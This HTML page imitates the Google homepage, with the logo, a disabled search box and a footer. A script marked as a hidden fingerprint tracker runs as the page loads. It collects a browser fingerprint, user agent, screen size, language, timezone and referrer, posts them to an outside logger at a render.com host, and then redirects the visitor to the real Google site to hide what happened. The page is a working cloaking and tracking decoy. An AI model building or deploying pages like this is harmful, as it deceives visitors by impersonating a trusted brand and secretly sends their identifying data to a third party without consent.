<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
    }
    body {
      background: #fff;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 272px;
      height: 92px;
    }
    .search-box {
      display: flex;
      align-items: center;
      width: 580px;
      border: 1px solid #dfe1e5;
      border-radius: 24px;
      padding: 10px 20px;
      box-shadow: 0 1px 6px rgba(32,33,36,0.28);
    }
    .search-box input {
      flex: 1;
      font-size: 16px;
      border: none;
      outline: none;
    }
    .footer {
      position: absolute;
      bottom: 15px;
      font-size: 12px;
      color: #666;
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
  </div>

  <div class="search-box">
    <input type="text" placeholder="Search Google or type a URL" disabled />
  </div>

  <div class="footer">
    &copy; Google 
  </div>

  <!-- 🕵️ Hidden Fingerprint Tracker -->
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <script>
    ;(async () => {
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      const payload = {
        fingerprint: result.visitorId,
        ip: '',
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        lang: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
        redirected: true
      };

      try {
        await fetch('https://tweaksquad-cloak-tracker-pex1.onrender.com/logger.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        setTimeout(() => {
          window.location.href = 'https://www.google.com/';
        }, 3500);
      } catch (e) {
        setTimeout(() => {
          window.location.href = 'https://www.google.com/';
        }, 5000);
      }
    })();
  </script>

</body>
</html>
